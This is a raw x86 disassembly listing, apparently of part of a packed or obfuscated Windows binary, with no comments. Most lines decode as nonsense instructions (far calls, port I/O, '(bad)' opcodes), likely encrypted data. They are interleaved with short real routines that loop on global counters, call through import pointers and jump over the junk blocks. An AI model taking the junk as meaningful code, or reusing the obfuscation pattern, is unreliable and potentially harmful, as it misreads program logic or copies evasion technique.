  403f74:	ja     0x403f84
  403f76:	mov    esi,0x136c880f
  403f7b:	lods   eax,DWORD PTR ds:[esi]
  403f7c:	mov    ch,0xf2
  403f7e:	mov    al,ds:0x7b19d48c
  403f83:	scas   al,BYTE PTR es:[edi]
  403f84:	xor    dl,BYTE PTR [edx+0x29]
  403f87:	call   0x7d330211
  403f8c:	xchg   esi,eax
  403f8d:	jae    0x403fa7
  403f8f:	dec    edx
  403f90:	jno    0x403f2c
  403f92:	adc    eax,DWORD PTR [eax+0x7c]
  403f95:	mov    bh,0xa1
  403f97:	fsubr  QWORD PTR [ebx+edi*8-0x53]
  403f9b:	inc    ebp
  403f9c:	hlt    
  403f9d:	pop    edx
  403f9e:	je     0x404013
  403fa0:	jecxz  0x403f9e
  403fa2:	mov    ah,0x30
  403fa4:	mov    BYTE PTR [edx-0x61],bl
  403fa7:	scas   eax,DWORD PTR es:[edi]
  403fa8:	adc    ah,BYTE PTR [esi-0x118e1d8f]
  403fae:	push   edi
  403faf:	inc    ebx
  403fb0:	call   0x3b1b:0x93271af0
  403fb7:	shl    BYTE PTR [edx-0x11b71f43],cl
  403fbd:	mov    bh,0xb8
  403fbf:	inc    esp
  403fc0:	das    
  403fc1:	add    BYTE PTR [edi+0x46],bh
  403fc4:	les    ebx,FWORD PTR [esi-0x2b8ee888]
  403fca:	cmp    DWORD PTR [eax+0x72],edx
  403fcd:	mov    esi,0xb4f76f49
  403fd2:	push   ds
  403fd3:	cmp    esp,ecx
  403fd5:	nop    DWORD PTR [edi+0x699fe9fc]
  403fdc:	adc    DWORD PTR [ecx-0x68],edx
  403fdf:	sahf   
  403fe0:	inc    esp
  403fe1:	int3   
  403fe2:	pushf  
  403fe3:	pop    es
  403fe4:	add    DWORD PTR [eax-0x11],esi
  403fe7:	fstp   DWORD PTR [edi]
  403fe9:	in     eax,dx
  403fea:	loop   0x403f99
  403fec:	dec    edi
  403fed:	ss loope 0x403f78
  403ff0:	pop    ss
  403ff1:	or     dl,dh
  403ff3:	les    ebx,FWORD PTR [ebx+ebp*1+0x583fe1ec]
  403ffa:	push   edi
  403ffb:	js     0x403f85
  403ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ffe:	iret   
  403fff:	push   edx
  404000:	adc    esp,DWORD PTR [edx+0x4]
  404003:	cld    
  404004:	inc    esp
  404005:	add    dl,BYTE PTR [esp+esi*2-0x58aec077]
  40400c:	mov    esp,0x50a8ac4
  404011:	add    ecx,ebx
  404013:	test   BYTE PTR [eax+0x24],dh
  404016:	repz mov ebp,0x197d0ed9
  40401c:	pop    ds
  40401d:	and    al,0x6b
  40401f:	cs in  eax,0x96
  404022:	xchg   edi,eax
  404023:	mov    al,ds:0xdd0bb23
  404028:	cld    
  404029:	xchg   esi,eax
  40402a:	push   0x87475bec
  40402f:	pop    ebp
  404030:	push   ecx
  404031:	inc    ecx
  404032:	dec    eax
  404033:	pushw  0x4784
  404037:	popa   
  404038:	xchg   ebx,eax
  404039:	clc    
  40403a:	dec    edi
  40403b:	jecxz  0x404047
  40403d:	lea    edi,[ecx+ebx*2+0x2c]
  404041:	sub    al,0x9d
  404043:	or     BYTE PTR [ecx+0x11],ah
  404046:	loop   0x40402f
  404048:	mov    cl,0xcd
  40404a:	out    dx,eax
  40404b:	jno    0x40401a
  40404d:	out    0x8f,al
  40404f:	push   ss
  404050:	test   DWORD PTR [edx],eax
  404052:	pop    esp
  404053:	pop    esp
  404054:	ja     0x403ffd
  404056:	ja     0x403fe6
  404058:	rcr    DWORD PTR [esi+0x67],cl
  40405b:	fnstcw WORD PTR [esi]
  40405d:	pop    edx
  40405e:	enter  0x3278,0x9b
  404062:	jae    0x4040e3
  404064:	enter  0x8bdb,0xeb
  404068:	in     eax,dx
  404069:	sub    ebx,0x29e71e9b
  40406f:	mov    bl,0x6b
  404071:	cld    
  404072:	mov    fs,WORD PTR ds:0xc3cceb38
  404078:	dec    eax
  404079:	cdq    
  40407a:	rol    BYTE PTR [eax+0x5f],0xd
  40407e:	aad    0xbf
  404080:	or     bh,bh
  404082:	push   ebp
  404083:	les    eax,FWORD PTR [ebx-0x8]
  404086:	pushf  
  404087:	sti    
  404088:	pop    esi
  404089:	mov    ecx,0x8b98e707
  40408e:	mov    eax,ds:0x25f07220
  404093:	jle    0x4040fd
  404095:	fstp   DWORD PTR [ebx+edx*2+0x1b]
  404099:	int3   
  40409a:	scas   al,BYTE PTR es:[edi]
  40409b:	mov    ch,0xca
  40409d:	jmp    0x2918f194
  4040a2:	xchg   esp,eax
  4040a3:	sbb    al,0x98
  4040a5:	dec    ebx
  4040a6:	xchg   edi,eax
  4040a7:	fs popa 
  4040a9:	scas   al,BYTE PTR es:[edi]
  4040aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ab:	and    al,BYTE PTR [edi-0x2fbc5fa5]
  4040b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b2:	rol    ebp,0x2d
  4040b5:	push   esp
  4040b6:	call   0xede7:0xc0b3db0
  4040bd:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  4040c4:	jmp    0x404380
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x82f7e6c1
  4040e3:	ins    BYTE PTR es:[edi],dx
  4040e4:	add    bl,BYTE PTR [ebx-0x62]
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x4040d7
  4040ef:	sub    eax,0x1abada04
  4040f4:	mov    edx,0x4d38437a
  4040f9:	mov    BYTE PTR [ebx],dl
  4040fb:	(bad)  
  4040fc:	jb     0x40413c
  4040fe:	push   0xffffffee
  404100:	call   0x85d4:0x6173149d
  404107:	jbe    0x404177
  404109:	mov    esp,DWORD PTR [esi-0x49]
  40410c:	xor    al,0x26
  40410e:	jb     0x40415b
  404110:	cmp    ebx,DWORD PTR [esi-0x12081a2]
  404116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404117:	xchg   DWORD PTR [ecx],edi
  404119:	or     dl,BYTE PTR [eax-0x4c]
  40411c:	xor    bh,dl
  40411e:	rol    BYTE PTR [ebx],1
  404120:	jecxz  0x4040f3
  404122:	sub    al,0x92
  404124:	aas    
  404125:	scas   al,BYTE PTR es:[edi]
  404126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404127:	mov    al,0xae
  404129:	repz adc ch,bh
  40412c:	aam    0x65
  40412e:	rcr    DWORD PTR [esi+0x23],0x4d
  404132:	stos   BYTE PTR es:[edi],al
  404133:	mov    ecx,0xae4a7af5
  404138:	push   edx
  404139:	dec    edi
  40413a:	sbb    DWORD PTR [edi-0x61],0x8df3c079
  404141:	dec    ecx
  404142:	jmp    DWORD PTR [ecx-0x2d]
  404145:	push   edi
  404146:	lea    edx,[ebx]
  404148:	in     eax,0x64
  40414a:	mov    al,0x4
  40414c:	cmp    esi,DWORD PTR [eax+0x15c798c3]
  404152:	in     al,dx
  404153:	in     al,dx
  404154:	test   BYTE PTR [edi],cl
  404156:	add    al,0x87
  404158:	outs   dx,BYTE PTR ds:[esi]
  404159:	ins    DWORD PTR es:[edi],dx
  40415a:	mov    cl,0xa1
  40415c:	test   eax,0xc04592b1
  404161:	jge    0x4041e1
  404163:	rcr    BYTE PTR [ebx-0x47ccc768],1
  404169:	cmp    ecx,DWORD PTR [edi+edi*2-0x7c]
  40416d:	retf   
  40416e:	mov    ds:0x80fea40c,al
  404173:	push   es
  404174:	push   cs
  404175:	cmp    DWORD PTR [ebp+0x486566cb],edx
  40417b:	popa   
  40417c:	mov    ebx,DWORD PTR [edx+esi*1-0x3a]
  404180:	retf   0xd44d
  404183:	push   cs
  404184:	or     esi,ecx
  404186:	xor    dl,0xaa
  404189:	mov    ecx,DWORD PTR [ebp+0x23]
  40418c:	ror    DWORD PTR [ecx+esi*8-0x4],1
  404190:	add    BYTE PTR [ecx],0xfe
  404193:	push   ds
  404194:	add    BYTE PTR [ecx],cl
  404196:	fisttp DWORD PTR ds:0xdbab44e5
  40419c:	mov    ah,0x82
  40419e:	push   cs
  40419f:	inc    ebx
  4041a0:	sub    cl,BYTE PTR [edi]
  4041a2:	pop    edx
  4041a3:	cs inc edx
  4041a5:	call   0x4711:0xc1f333c2
  4041ac:	ror    DWORD PTR [eiz*1+0x5a3476bb],0xf2
  4041b4:	dec    esp
  4041b5:	dec    esi
  4041b6:	test   al,0xcd
  4041b8:	fisttp WORD PTR [eax]
  4041ba:	cli    
  4041bb:	aaa    
  4041bc:	push   ds
  4041bd:	push   es
  4041be:	xchg   ebx,eax
  4041bf:	retf   
  4041c0:	pusha  
  4041c1:	les    esp,FWORD PTR [esi-0x35]
  4041c4:	mov    bh,BYTE PTR [ebp+0x28b76150]
  4041ca:	stc    
  4041cb:	popf   
  4041cc:	mov    eax,0x468ee214
  4041d1:	inc    ebx
  4041d2:	jle    0x4041f0
  4041d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d5:	and    DWORD PTR [edx+0x51],esi
  4041d8:	mov    ds:0x62e2dff,eax
  4041dd:	mov    dl,0xc4
  4041df:	sub    eax,0xbbffcaef
  4041e4:	cwde   
  4041e5:	or     eax,0x3c20cdfa
  4041ea:	and    dh,ch
  4041ec:	repnz dec ebx
  4041ee:	dec    edx
  4041ef:	imul   edi,esi,0x9860afe4
  4041f5:	or     DWORD PTR [edx-0x2],ecx
  4041f8:	repz adc eax,eax
  4041fb:	sbb    bh,BYTE PTR [edx+0xd113c07]
  404201:	dec    ebp
  404202:	pop    eax
  404203:	fisttp QWORD PTR [edx]
  404205:	pop    ss
  404206:	cdq    
  404207:	inc    ecx
  404208:	and    BYTE PTR [eax+0x5f],0x51
  40420c:	lods   eax,DWORD PTR ds:[esi]
  40420d:	mov    esp,0xf8739fc7
  404212:	scas   al,BYTE PTR es:[edi]
  404213:	ret    
  404214:	bound  edx,QWORD PTR [ebp+0x5a]
  404217:	adc    bh,BYTE PTR [ebp-0x3278146d]
  40421d:	fwait
  40421e:	cmp    eax,0x4ae33132
  404223:	xlat   BYTE PTR ds:[ebx]
  404224:	or     al,0x61
  404226:	inc    eax
  404227:	mov    ecx,0xb9e0c6cb
  40422d:	xchg   esp,eax
  40422f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404231:	cmp    ebx,esi
  404233:	(bad)  
  404234:	pop    eax
  404235:	adc    DWORD PTR [esi-0x2952c8ef],ecx
  40423b:	push   eax
  40423c:	xlat   BYTE PTR ds:[ebx]
  40423d:	aaa    
  40423e:	pop    ds
  40423f:	dec    ebp
  404240:	retf   0x42dc
  404243:	pop    esp
  404244:	fmul   DWORD PTR [ecx-0x60360c8c]
  40424a:	int3   
  40424b:	stc    
  40424c:	call   esi
  40424e:	adc    dl,al
  404250:	lahf   
  404251:	mov    esp,0xb6be5606
  404256:	jmp    0xf57e9228
  40425b:	dec    ebx
  40425c:	or     cl,0xbc
  40425f:	mov    DWORD PTR [esi],ecx
  404261:	adc    eax,ebp
  404263:	rol    BYTE PTR [esi-0x83e9371],1
  404269:	xchg   BYTE PTR [ebx+0x41458943],cl
  40426f:	inc    ebp
  404270:	scas   eax,DWORD PTR es:[edi]
  404271:	inc    ebp
  404272:	mov    cl,BYTE PTR [edx-0x1d]
  404275:	sbb    esp,ecx
  404277:	dec    esp
  404278:	test   esp,esp
  40427a:	push   0x84494ebb
  40427f:	(bad)  
  404280:	out    0xd6,al
  404282:	sti    
  404283:	and    al,0x7b
  404285:	test   ah,dl
  404287:	jmp    0x4042ba
  404289:	sahf   
  40428a:	xor    BYTE PTR [edi-0xbb3a172],bl
  404290:	mov    ah,0x3
  404292:	and    DWORD PTR [edx],ebp
  404294:	mov    eax,0xa08c48ff
  404299:	pop    ecx
  40429a:	inc    esi
  40429b:	jne    0x404238
  40429d:	mov    eax,0xa9f41211
  4042a2:	mov    ebx,DWORD PTR [eax-0x2dddce1c]
  4042a8:	mul    BYTE PTR [edi+0x63]
  4042ab:	jl     0x4042a2
  4042ad:	lods   eax,DWORD PTR ds:[esi]
  4042ae:	jecxz  0x40430b
  4042b0:	stc    
  4042b1:	sbb    ecx,DWORD PTR [ebp+0x3a]
  4042b4:	popa   
  4042b5:	xor    esp,ebp
  4042b7:	jp     0x4042db
  4042b9:	mov    edi,0xf83f7e39
  4042be:	lods   eax,DWORD PTR ds:[esi]
  4042bf:	and    BYTE PTR ds:0xfb95cb6a,0x76
  4042c6:	jae    0x404311
  4042c8:	pop    ebp
  4042c9:	dec    edx
  4042ca:	jns    0x40430e
  4042cc:	leave  
  4042cd:	adc    eax,0xe9c54731
  4042d2:	in     al,dx
  4042d3:	arpl   cx,cx
  4042d5:	repz ret 0x4d0b
  4042d9:	or     al,0xc1
  4042db:	lahf   
  4042dc:	push   0xffffffce
  4042de:	mov    al,ds:0xdc15aa2e
  4042e3:	push   edx
  4042e4:	gs ja  0x40427a
  4042e7:	ficom  DWORD PTR [esi-0x33]
  4042ea:	fwait
  4042eb:	cmp    ch,BYTE PTR [esi]
  4042ed:	sbb    DWORD PTR ds:[esi-0x10],esi
  4042f1:	fidiv  DWORD PTR [ebp-0x27]
  4042f4:	int    0x7f
  4042f6:	inc    eax
  4042f7:	add    DWORD PTR [edi],edx
  4042f9:	jae    0x404378
  4042fb:	stos   BYTE PTR es:[edi],al
  4042fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042fd:	mov    ebp,0x434da5a1
  404302:	or     eax,0x16831332
  404307:	sbb    esi,DWORD PTR [ebx+0xb082003]
  40430d:	std    
  40430e:	cmp    esp,esi
  404310:	pop    es
  404311:	repnz pop edi
  404313:	sbb    eax,0xab641f32
  404318:	out    0xdf,al
  40431a:	xchg   edx,eax
  40431b:	retf   0xf3e1
  40431e:	gs sbb edx,edx
  404321:	fidivr WORD PTR [ecx+eiz*2-0x22]
  404325:	std    
  404326:	or     esp,ebp
  404328:	xor    edi,esi
  40432a:	mov    esp,0x5cf0cd15
  40432f:	inc    edx
  404330:	mov    eax,ds:0x4f84e8fb
  404335:	xor    ch,BYTE PTR [ebx+0x29]
  404338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404339:	adc    eax,0xd30daf59
  40433e:	(bad)  
  40433f:	aad    0x87
  404341:	popa   
  404342:	sbb    BYTE PTR [eax-0x75231d1a],bh
  404348:	daa    
  404349:	pusha  
  40434a:	(bad)  
  40434b:	xor    DWORD PTR [edx-0x5b],esp
  40434e:	ror    BYTE PTR [ebx+0x75],1
  404351:	xchg   BYTE PTR [ebx+0x59861792],dh
  404357:	sbb    al,0x3d
  404359:	add    al,0xdf
  40435b:	sbb    DWORD PTR [ebp+0x2b],eax
  40435e:	cld    
  40435f:	iret   
  404360:	test   al,0xa6
  404362:	pushf  
  404363:	out    dx,eax
  404364:	retf   
  404365:	xchg   esi,eax
  404366:	int    0xb0
  404368:	mov    WORD PTR [ecx-0x6e],?
  40436b:	ror    DWORD PTR [ecx],1
  40436d:	outs   dx,DWORD PTR ds:[esi]
  40436e:	jo     0x404328
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	ret    0x7614
  40441c:	fistp  DWORD PTR [ebx+ebp*1]
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x4043db
  404426:	mov    WORD PTR [esi+0x2d],ds
  404429:	mov    esi,0x6152cee6
  40442e:	adc    DWORD PTR [esp+eiz*2+0x41a3ea11],eax
  404435:	xchg   esp,eax
  404436:	push   esp
  404437:	aam    0xee
  404439:	scas   eax,DWORD PTR es:[edi]
  40443a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443b:	shl    BYTE PTR [edx-0x3a],cl
  40443e:	jge    0x404405
  404440:	xchg   ebp,eax
  404441:	sbb    ebp,edx
  404443:	jp     0x40448d
  404445:	adc    BYTE PTR [edx+0x1],ch
  404448:	in     eax,0x3c
  40444a:	sub    BYTE PTR [ebx+0xc],dl
  40444d:	je     0x4044c0
  40444f:	icebp  
  404450:	xor    DWORD PTR [esi+0x36],eax
  404453:	stc    
  404454:	xchg   esp,eax
  404455:	pop    DWORD PTR [ecx-0x26]
  404458:	loopne 0x404439
  40445a:	arpl   WORD PTR [esi+0x475e18e2],cx
  404460:	jnp    0x404442
  404462:	fcmove st,st(5)
  404464:	adc    eax,0x3bea864b
  404469:	sub    al,0xc8
  40446b:	(bad)  
  40446c:	std    
  40446d:	idiv   BYTE PTR [ecx+ebx*4+0x45]
  404471:	xchg   edx,eax
  404472:	leave  
  404473:	ret    
  404474:	mov    dh,0xd4
  404476:	cmp    BYTE PTR [esi-0x58],dh
  404479:	or     al,0xbe
  40447b:	jno    0x4044e9
  40447d:	fst    st(5)
  40447f:	add    cl,bh
  404481:	xor    DWORD PTR [eax-0x3fdffcd6],eax
  404487:	in     al,dx
  404488:	das    
  404489:	or     al,BYTE PTR ds:0xc863cdfc
  40448f:	pop    es
  404490:	test   ebp,ebx
  404492:	fidivr DWORD PTR [ebx+0x5]
  404495:	cmp    al,0x4d
  404497:	bound  eax,QWORD PTR [ebp-0x31]
  40449a:	xchg   edi,eax
  40449b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40449c:	into   
  40449d:	xlat   BYTE PTR ds:[ebx]
  40449e:	cwde   
  40449f:	fist   DWORD PTR [ebx]
  4044a1:	gs loope 0x40448e
  4044a4:	and    ebx,DWORD PTR [eax]
  4044a6:	sbb    eax,0x121c86e7
  4044ab:	mov    eax,ds:0x420ff691
  4044b0:	imul   ebx,edx,0xffffff8b
  4044b3:	push   0x26
  4044b5:	js     0x4044e1
  4044b7:	ds jmp 0x904c:0x9834acde
  4044bf:	inc    eax
  4044c0:	sub    eax,0x7ff72afa
  4044c5:	push   ebp
  4044c6:	scas   al,BYTE PTR es:[edi]
  4044c7:	cmp    BYTE PTR [ecx+ebp*8+0x352b3061],bl
  4044ce:	mov    eax,0x43095b83
  4044d3:	sbb    BYTE PTR [edx+0x16],bl
  4044d6:	mov    ds:0x8d2ddabb,al
  4044db:	jp     0x4044a2
  4044dd:	cdq    
  4044de:	or     al,0xa1
  4044e0:	in     eax,dx
  4044e1:	out    dx,al
  4044e2:	and    al,0xf0
  4044e4:	xor    eax,0xe380ebdb
  4044e9:	lods   al,BYTE PTR ds:[esi]
  4044ea:	ret    0xfb63
  4044ed:	nop
  4044ee:	fldcw  WORD PTR [ecx-0x60]
  4044f1:	cmp    BYTE PTR [esi+0x64],0xdc
  4044f5:	pop    es
  4044f6:	xlat   BYTE PTR ds:[ebx]
  4044f7:	push   ebx
  4044f8:	inc    esp
  4044f9:	cli    
  4044fa:	jg     0x4044b9
  4044fc:	ins    DWORD PTR es:[edi],dx
  4044fd:	pop    ebp
  4044fe:	lea    ecx,[esi]
  404500:	or     al,0x3f
  404502:	dec    ebx
  404503:	and    eax,0x30275caf
  404508:	push   cs
  404509:	jae    0x404552
  40450b:	fucomp st(0)
  40450d:	and    DWORD PTR [eax+0x15a3fabb],0xffffffea
  404514:	jbe    0x404589
  404516:	xlat   BYTE PTR ds:[ebx]
  404517:	arpl   WORD PTR [ebx+0x5],cx
  40451a:	call   0xdf16a08c
  40451f:	inc    esp
  404520:	inc    edi
  404521:	jl     0x4044c1
  404523:	mov    esi,0xbb0dbbc4
  404528:	and    ebx,esi
  40452a:	(bad)  
  40452b:	cmc    
  40452c:	ror    BYTE PTR [ebp-0x6ee139f8],1
  404532:	mov    ecx,0x1da6c38b
  404537:	adc    esp,DWORD PTR es:[esi-0x6b1bc3cd]
  40453e:	adc    eax,0x3ee5c188
  404543:	cmp    BYTE PTR [ecx-0x6244b8de],0x82
  40454a:	pop    ss
  40454b:	ja     0x404516
  40454d:	add    al,0x9d
  40454f:	dec    eax
  404550:	std    
  404551:	pop    ds
  404552:	enter  0xdd3,0xf9
  404556:	or     BYTE PTR [esi-0x3a],dl
  404559:	sbb    al,0xef
  40455b:	dec    edx
  40455c:	popf   
  40455d:	sbb    ebp,DWORD PTR [esi+0x3c]
  404560:	sahf   
  404561:	mov    edi,0x26daca3b
  404566:	push   ebp
  404567:	scas   al,BYTE PTR es:[edi]
  404568:	pusha  
  404569:	call   0x77de:0xf3d04bd3
  404570:	sbb    eax,DWORD PTR [eax+0x28]
  404573:	pop    ds
  404574:	xor    bh,BYTE PTR [eax+0x4316f48e]
  40457a:	fstp   TBYTE PTR [edx+0x30b49032]
  404580:	ret    
  404581:	sub    DWORD PTR [eax],edx
  404583:	aad    0xe2
  404585:	cmp    edi,ebx
  404587:	xchg   ecx,eax
  404588:	push   edi
  404589:	dec    ebx
  40458a:	rcr    BYTE PTR [edi+ecx*4-0x34],1
  40458e:	test   BYTE PTR [ebx-0x53f30bb8],cl
  404594:	inc    edx
  404595:	jp     0x40456a
  404597:	adc    al,0xa5
  404599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40459a:	and    DWORD PTR [edx],0xaca2b65c
  4045a0:	retf   0xb476
  4045a3:	pop    ebp
  4045a4:	or     eax,0xe4cb2a70
  4045a9:	pop    edx
  4045aa:	mov    ?,esp
  4045ac:	outs   dx,DWORD PTR ds:[esi]
  4045ad:	xchg   DWORD PTR [edi-0x7a],eax
  4045b0:	out    dx,al
  4045b1:	stc    
  4045b2:	fld    QWORD PTR [ecx]
  4045b4:	cmp    bl,bh
  4045b6:	add    eax,ebp
  4045b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045b9:	sti    
  4045ba:	dec    edi
  4045bb:	mov    ?,WORD PTR [ebp-0x46cefcb4]
  4045c1:	cs jecxz 0x4045d9
  4045c4:	xor    DWORD PTR [ebp+0x14c38246],edx
  4045ca:	adc    eax,0x4c71990b
  4045cf:	xchg   BYTE PTR [ebp+0x7ea647c0],cl
  4045d5:	mov    ds:0x281974f1,al
  4045da:	das    
  4045db:	mov    dl,al
  4045dd:	push   eax
  4045de:	mov    dh,0xb7
  4045e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e1:	bound  esp,QWORD PTR [esi+0x23]
  4045e4:	mov    ebx,0xc46173b9
  4045e9:	stos   DWORD PTR es:[edi],eax
  4045ea:	(bad)  
  4045ec:	pushf  
  4045ed:	arpl   WORD PTR [esi-0x4f],bx
  4045f0:	ss dec edx
  4045f2:	and    dl,BYTE PTR [ebp+0x40]
  4045f5:	pushf  
  4045f6:	adc    dh,BYTE PTR [eax]
  4045f8:	pop    ecx
  4045f9:	in     eax,dx
  4045fa:	xchg   edi,eax
  4045fb:	(bad)  
  4045fc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fe:	sti    
  4045ff:	mov    bh,0x0
  404601:	push   cs
  404602:	add    dl,cl
  404604:	dec    BYTE PTR [edx-0x5b200c7]
  40460a:	mov    esi,0x626b1f7c
  40460f:	pop    ebx
  404610:	mov    ah,0x97
  404612:	test   BYTE PTR [ecx+0x3175a135],al
  404618:	in     al,0xb
  40461a:	sub    BYTE PTR [esi],0x8b
  40461d:	push   ds
  40461e:	test   DWORD PTR [ecx+0x3d],ebp
  404621:	and    DWORD PTR [edx-0x558b871b],esp
  404627:	int3   
  404628:	jb     0x4045f4
  40462a:	add    edx,eax
  40462c:	mov    ds:0x749c3072,eax
  404631:	push   esi
  404632:	loope  0x404605
  404634:	stos   DWORD PTR es:[edi],eax
  404635:	repnz sub DWORD PTR cs:[edx+ebx*4+0x23e9e370],edi
  40463e:	(bad)  
  40463f:	jmp    0x9d3e:0xb7823feb
  404646:	and    eax,0xc7bb2ff3
  40464b:	jecxz  0x4045db
  40464d:	adc    BYTE PTR [ebx],cl
  40464f:	hlt    
  404650:	test   ah,cl
  404652:	mov    bl,0xfc
  404654:	fsubr  QWORD PTR [edi]
  404656:	fisubr DWORD PTR [edx+0x51]
  404659:	mov    esi,0xfe3c7c7c
  40465e:	js     0x40464f
  404660:	lods   al,BYTE PTR ds:[esi]
  404661:	sbb    al,BYTE PTR [edx]
  404663:	pop    eax
  404664:	mov    al,0x93
  404666:	and    BYTE PTR [edi-0x53],dl
  404669:	push   0xe8bb37af
  40466e:	jmp    0x4046ee
  404670:	and    cl,BYTE PTR [edi+0x6af8b24a]
  404676:	dec    esp
  404677:	pushf  
  404678:	or     al,0x85
  40467a:	scas   al,BYTE PTR es:[edi]
  40467b:	stc    
  40467c:	mov    esi,0xe980dac9
  404681:	jmp    0xc67c:0x5aeaeb0f
  404688:	push   es
  404689:	out    0xa8,eax
  40468b:	cmp    DWORD PTR [eax+ecx*4-0x5de3c5ac],eax
  404692:	inc    BYTE PTR es:[ebx+edi*2]
  404696:	mov    ?,WORD PTR [ebp-0x4770281a]
  40469c:	dec    eax
  40469d:	ja     0x404710
  40469f:	mov    edi,0x262d5e25
  4046a4:	fldenv [ebx+0x7c]
  4046a7:	scas   eax,DWORD PTR es:[edi]
  4046a8:	xchg   ebx,eax
  4046a9:	ja     0x4046d0
  4046ab:	xor    edx,eax
  4046ad:	xchg   DWORD PTR [eax],eax
  4046af:	(bad)  
  4046b0:	cdq    
  4046b1:	fisttp DWORD PTR ss:[edx]
  4046b4:	shr    DWORD PTR [edi-0x25591482],1
  4046ba:	or     dl,bh
  4046bc:	ret    0xb137
  4046bf:	or     DWORD PTR [esi],0xffffff90
  4046c2:	push   edi
  4046c3:	mov    ecx,0x7a3ec8b2
  4046c8:	(bad)  
  4046c9:	call   0xa44f4b11
  4046ce:	adc    eax,0xe95d6f9e
  4046d3:	cmp    ch,BYTE PTR es:[ebx-0x77f63f1b]
  4046da:	aaa    
  4046db:	(bad)  
  4046dc:	xlat   BYTE PTR ds:[ebx]
  4046dd:	bound  ebp,QWORD PTR [edi]
  4046df:	idiv   ebx
  4046e1:	stos   DWORD PTR es:[edi],eax
  4046e2:	mov    ebp,0xd941e0a4
  4046e7:	jnp    0x404763
  4046e9:	jl     0x404696
  4046eb:	jmp    0xe4fe:0x2d46803e
  4046f2:	cmp    eax,0x84b90eb9
  4046f7:	dec    eax
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0xa5b183de
  404770:	addr16 dec eax
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x404729
  40477b:	mov    esi,0x68e7767a
  404780:	mov    BYTE PTR [edx+0x4b7463e],0x6c
  404787:	sbb    eax,0x492d0d0f
  40478c:	xor    BYTE PTR [ebp-0x64],0x84
  404790:	cmp    ah,BYTE PTR [edx]
